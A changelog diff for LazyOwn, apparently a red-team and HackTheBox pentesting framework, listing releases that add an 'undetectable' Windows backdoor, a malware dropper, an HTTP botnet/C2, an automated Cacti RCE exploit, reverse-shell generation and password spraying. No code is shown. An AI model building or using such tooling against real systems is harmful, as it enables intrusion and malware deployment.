+  *   * feature(feat): new commands and functionalities \n\n Version: release/0.1.51 \n\n ldapsearch, downloader, windapsearchscrapeusers, refactor smbserver all documented at COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Sep 29 03:35:18 2024 -0300 \n\n Hora: 1727591718
+
+
+### Refactorización
+
+### Otros
+
+  *   * refactor(refactor): smbclient refactor, cme refactor, netexec, refactor, new command pwncat with self inyect, c2 windows client, kerbrute refactor, kussanagi generate payloads and refactor of payload.json now has domain adn subdomain \n\n Version: release/0.1.50 \n\n soon video on youtube :D now you can see https://www.youtube.com/watch?v=9_9vevmmgMg \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - payload.json - payload1.json - sessions/users.txt - sessions/win/lazybot.ps1 - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Sep 28 04:04:43 2024 -0300 \n\n Hora: 1727507083
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new command Shadowsocks \n\n Version: release/0.1.50 \n\n with love to the comunity :D \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Sep 25 22:59:45 2024 -0300 \n\n Hora: 1727315985
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): now we are vip \n\n Version: release/0.1.49 \n\n  \n\n Modified file(s):\n- .gitignore - COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - external/install_external.sh - lazyown - payload.json - payload1.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Sep 23 02:57:23 2024 -0300 \n\n Hora: 1727071043
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new commands documented at COMMANDS.md \n\n Version: release/0.1.48 \n\n gitdumper, powershell_cmd_stager, shellcode_search, ligolo \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Sep 22 22:12:21 2024 -0300 \n\n Hora: 1727053941
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(testing): some test and new resources and externals scripst to download :D \n\n Version: release/0.1.47 \n\n caption and trickster was pwned :P \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - sessions/download_resources.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Sep 22 20:22:53 2024 -0300 \n\n Hora: 1727047373
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new cool stuff xD \n\n Version: release/0.1.47 \n\n parse id rsa from 4xura \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Sep 14 18:29:53 2024 -0300 \n\n Hora: 1726349393
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(win backdoor): undetectable \n\n Version: release/0.1.46 \n\n handcrafted malware undetectable ;) to windows \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Sep 14 04:55:13 2024 -0300 \n\n Hora: 1726300513
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(fix): c2 insecure filename \n\n Version: release/0.1.45 \n\n resolved \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - modules/lazyc2.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Sep 14 04:42:54 2024 -0300 \n\n Hora: 1726299774
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(docs): documented resources, and externals, and one command dr0p1t \n\n Version: release/0.1.44 \n\n documented at COMMANDS.md as an Execute the Dr0p1t tool to create a stealthy malware dropper. \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - sessions/download_resources.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Sep 14 03:10:13 2024 -0300 \n\n Hora: 1726294213
+
+
+### Otros
+
+### Otros
+
+  *   * feature(new commands): documented at COMMANDS.md \n\n Version: release/0.1.44 \n\n vscan, shellshock, generate_revshell, alterx, allin. \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - modules/lazyc2.py - sessions/download_resources.sh - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Sep 12 03:37:43 2024 -0300 \n\n Hora: 1726123063
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): new commands: scarecrow, createmail, eyewitness, secretsdump, getuserspns, passwordspray \n\n Version: release/0.1.43 \n\n documented at COMMANDS.md esporalibre.cl \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Sep 11 02:46:35 2024 -0300 \n\n Hora: 1726033595
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): install \n\n Version: release/0.1.42 \n\n dou you seaw [3~pip install requests \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - install.sh - requirements.txt\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Sep 11 02:10:10 2024 -0300 \n\n Hora: 1726031410
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): install \n\n Version: release/0.1.42 \n\n testing... \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - requirements.txt\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Sep 10 02:41:23 2024 -0300 \n\n Hora: 1725946883
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): graph \n\n Version: release/0.1.42 \n\n integrated at index2.html :D \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - modules/lazynmap.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Sep 10 01:54:21 2024 -0300 \n\n Hora: 1725944061
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): 2 new commands \n\n Version: release/0.1.41 \n\n shellfire, evil_ssdp documented at COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Sep 9 20:45:20 2024 -0300 \n\n Hora: 1725925520
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): install testing \n\n Version: release/0.1.40 \n\n reported by user \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Sep 9 09:36:28 2024 -0300 \n\n Hora: 1725885388
+
+
+### Correcciones urgentes
+
+### Otros
+
+  *   * hotfix(hotfix): install wa broken \n\n Version: release/0.1.40 \n\n infinite loop \n\n Modified file(s):\n- .gitignore - README.md - docs/README.html - docs/index.html - docs/index.html.bak - install.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Sep 9 09:25:02 2024 -0300 \n\n Hora: 1725884702
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(testing): emire \n\n Version: release/0.1.39 \n\n empire xD \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload1.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Sep 8 05:35:22 2024 -0300 \n\n Hora: 1725784522
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): veil \n\n Version: release/0.1.39 \n\n new evasion tool testing testing testing \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Sep 8 04:46:46 2024 -0300 \n\n Hora: 1725781606
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): now tord, trace, and generatedic to generate dictionary with params \n\n Version: release/0.1.39 \n\n :D \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - payload.json - sessions/download_resources.sh - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Sep 7 01:41:09 2024 -0400 \n\n Hora: 1725687669
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): testing new feature tord \n\n Version: release/0.1.38 \n\n documented at COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - sessions/tor.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Sep 6 03:29:03 2024 -0400 \n\n Hora: 1725607743
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): ivy shellcodes test \n\n Version: release/0.1.38 \n\n new command documented at commands.md \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Sep 6 02:56:06 2024 -0400 \n\n Hora: 1725605766
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(docs): new alias \n\n Version: release/0.1.38 \n\n new alias tor documented \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - sessions/tor.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Sep 5 01:49:22 2024 -0400 \n\n Hora: 1725515362
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(docs): corrections in text \n\n Version: release/0.1.38 \n\n and some capitals \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Sep 5 01:42:38 2024 -0400 \n\n Hora: 1725514958
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(docs): new links \n\n Version: release/0.1.38 \n\n automatic download link generated by the app \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Sep 5 01:22:00 2024 -0400 \n\n Hora: 1725513720
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(docs): better docs \n\n Version: release/0.1.38 \n\n is zen now :) \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Sep 4 02:31:58 2024 -0400 \n\n Hora: 1725431518
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(fet): msfpc \n\n Version: release/0.1.38 \n\n automation \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Sep 3 01:15:14 2024 -0400 \n\n Hora: 1725340514
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): comandos nuevos documentados en commands.md \n\n Version: release/0.1.37 \n\n davtest y backdoor_factory \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Sep 2 23:34:25 2024 -0400 \n\n Hora: 1725334465
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): new command apache_users & new options -p to use diferents payloads.json \n\n Version: release/0.1.36 \n\n now more oriented to redteams you can run multiple instances with multiple payloads \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - main.py - sessions/users.txt - sessions/win/winp.ps1 - templates/index.html - utils.py\nDeleted file(s):\n- main.py - templates/index.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Sep 1 05:45:31 2024 -0400 \n\n Hora: 1725183931
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(docs): documented malwarebazar \n\n Version: release/0.1.35 \n\n Fetches and displays malware information from the MalwareBazaar API based on the given tag. \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - sessions/download_resources.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Sep 1 00:21:33 2024 -0400 \n\n Hora: 1725164493
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(docs): documentating \n\n Version: release/0.1.35 \n\n functions dacledit and bloodyAD \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Sep 1 00:13:39 2024 -0400 \n\n Hora: 1725164019
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): Nuevos comandos documentados en COMMANDS.md \n\n Version: release/0.1.35 \n\n kerbrute, dacledit, bloodyAD, evilwinrm, getTGT \n\n Modified file(s):\n- .gitignore - COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - payload.json - sessions/php/LFI/scan-LFI.php - sessions/php/LFI/uploadshellLFI.php - sessions/php/ar-protable/arabportable.php - sessions/php/jo/bru-jo.php - sessions/php/jo/pass.txt - sessions/php/jo/site.txt - sessions/php/shell/c2.sh - sessions/php/shell/shell.php - sessions/php/user/user.php - sessions/php/wp/wp.php - sessions/users.txt\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 31 06:21:44 2024 -0400 \n\n Hora: 1725099704
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): nuevos comandos documetados en COMMANDS.md \n\n Version: release/0.1.34 \n\n changeme, enum4linux_ng, fuzz, sharpshooter, sliver_server, gencert \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - sessions/download_resources.sh - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 30 23:33:30 2024 -0400 \n\n Hora: 1725075210
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): nuevos comandos documentados en COMMANDS.md \n\n Version: release/0.1.33 \n\n sherlock, trufflehog, weevelygen, weevely \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 30 03:07:45 2024 -0400 \n\n Hora: 1725001665
+
+
+### Correcciones urgentes
+
+### Otros
+
+  *   * hotfix(hotfix): deleted the insecure chat \n\n Version: release/0.1.32 \n\n DELETED \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 30 02:58:04 2024 -0400 \n\n Hora: 1725001084
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): Nuevos comandos documentados en COMMANDS.md \n\n Version: release/0.1.31 \n\n parsero, nueclei, dmitry, msfrpc, graudit, cewl, sslscan \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - sessions/download_resources.sh - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 28 23:02:18 2024 -0400 \n\n Hora: 1724900538
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): Nuevos comandos documentados en COMMANDS.md \n\n Version: release/0.1.30 \n\n sqli, sshkey, crunch, malwarebazar, download_malwarebazar, and an easteregg :) \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Aug 27 02:47:43 2024 -0400 \n\n Hora: 1724741263
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(fix): some fixes in c2 \n\n Version: release/0.1.29 \n\n now curl attack \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Aug 27 01:53:40 2024 -0400 \n\n Hora: 1724738020
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(kick): to kick from net some ip \n\n Version: release/0.1.28 \n\n seend spoofed packet to kick some ip from our net \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Aug 27 00:53:52 2024 -0400 \n\n Hora: 1724734432
+
+
+### Otros
+
+### Otros
+
+  *   * feature(new command c2 documentad at COMMANDS.md): a little botnet over http :) \n\n Version: release/0.1.27 \n\n this is my second aproach the first is a little botnet using sockets, the new it's web :) \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Aug 26 03:07:21 2024 -0400 \n\n Hora: 1724656041
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(fix auto exploit cacti rce logged): now the attack work automated \n\n Version: release/0.1.26 \n\n smoothy \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Aug 26 02:18:44 2024 -0400 \n\n Hora: 1724653124
+
+
+### Otros
+
+### Otros
+
+  *   * feature(new commands docummented at COMMANDS.md): waybackmachine, morse, powerserver, shellshock, wifipass, ngrok and smalldic \n\n Version: release/0.1.25 \n\n with love by grisun0 \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - modules/headers.json - modules/lazyseo.py - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 24 23:28:31 2024 -0400 \n\n Hora: 1724556511
+
+
+### Otros
+
+### Otros
+
+  *   * feature(2 new attacks): docummented at COMMANDS.md \n\n Version: release/0.1.24 \n\n smbattack and cacti_exploit \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 24 15:22:18 2024 -0400 \n\n Hora: 1724527338
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(new machine): monitorsthree.htb \n\n Version: release/0.1.23 \n\n happyhacking \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - payload.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 24 03:15:09 2024 -0400 \n\n Hora: 1724483709
+
+
+### Refactorización
+
+### Otros
+
+  *   * refactor(new payload): in msfvenom \n\n Version: release/0.1.23 \n\n :) java jsp :) \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 24 01:45:02 2024 -0400 \n\n Hora: 1724478302
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(new feature): padbuster \n\n Version: release/0.1.23 \n\n new command padbuster documented at COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 24 00:11:22 2024 -0400 \n\n Hora: 1724472682
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(documentacion): nueva versiòn en la web reflejada en el banner \n\n Version: release/0.1.22 \n\n :) \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 24 00:03:47 2024 -0400 \n\n Hora: 1724472227
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(new documentation): better documentation to commands and utils \n\n Version: release/0.1.22 \n\n :) \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 23 23:30:32 2024 -0400 \n\n Hora: 1724470232
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(new feat in createdll): new option 3 to run automate create dll blazor malware \n\n Version: release/0.1.22 \n\n this attack its in 2 faces, first run lazymsfvenom or venom, crate shell.elf and you can cratedll option 3 :) \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - sessions/lin/blazormalware.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 23 23:13:14 2024 -0400 \n\n Hora: 1724469194
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(fix): blazormalware corrected now functional and armed :) \n\n Version: release/0.1.21 \n\n and lanter machine was pwned :P \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - sessions/lin/blazormalware.sh - sessions/win/lazycat.ps1 - sessions/win/rev.c\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 23 15:28:03 2024 -0400 \n\n Hora: 1724441283
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(Lang): Translate README.md to English, enhancing clarity and structure for better understanding of the project features and usage. \n\n Version: release/0.1.20 \n\n This commit translates the README.md file into English to make it accessible to a wider audience. The translation maintains the original content's intent while improving clarity and coherence. Additionally, I've structured the document to highlight key features, usage instructions, acknowledgments, and licensing information. This update aims to enhance the overall understanding of the LazyOwn project and its functionalities. \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 21 02:25:41 2024 -0400 \n\n Hora: 1724221541
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(malware new): blazor malware \n\n Version: release/0.1.20 \n\n create blazormalware.sh \n\n Modified file(s):\n- DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - sessions/download_resources.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Aug 20 03:17:47 2024 -0400 \n\n Hora: 1724138267
+
+
+### Refactorización
+
+### Otros
+
